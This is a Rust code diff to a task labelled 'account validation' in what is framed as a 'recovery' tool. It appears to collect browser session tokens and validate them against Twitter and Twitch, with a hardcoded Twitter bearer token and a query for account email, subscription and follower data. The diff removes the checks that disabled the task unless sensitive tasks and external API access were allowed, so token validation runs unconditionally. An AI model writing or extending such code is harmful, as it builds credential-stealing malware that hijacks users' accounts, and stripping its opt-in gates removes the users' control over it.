@@ -3,7 +3,6 @@ use crate::recovery::{
     chromium,
     context::RecoveryContext,
     fs::sanitize_label,
-    settings::RecoveryControl,
     task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
 };
 use async_trait::async_trait;
@@ -16,7 +15,7 @@ use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
 use tokio::{fs, task};
-use tracing::{debug, info, warn};
+use tracing::{debug, warn};
 
 const TWITTER_BEARER_TOKEN: &str = "AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA";
 const TWITCH_GRAPHQL: &str = r#"{"query":"query { user { id login displayName email hasPrime isPartner followers { totalCount } } }"}"#;
@@ -119,17 +118,6 @@ impl RecoveryTask for AccountValidationTask {
     }
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
-        let control = RecoveryControl::global();
-        if !control.allow_sensitive_tasks() {
-            info!("account validation skipped (sensitive tasks disabled)");
-            return Ok(Vec::new());
-        }
-
-        if !control.allow_external_api() {
-            info!("account validation skipped (external API access disabled)");
-            return Ok(Vec::new());
-        }
-
         let mut artifacts = Vec::new();
         let tokens = self.collect_tokens().await?;
         if tokens.is_empty() {
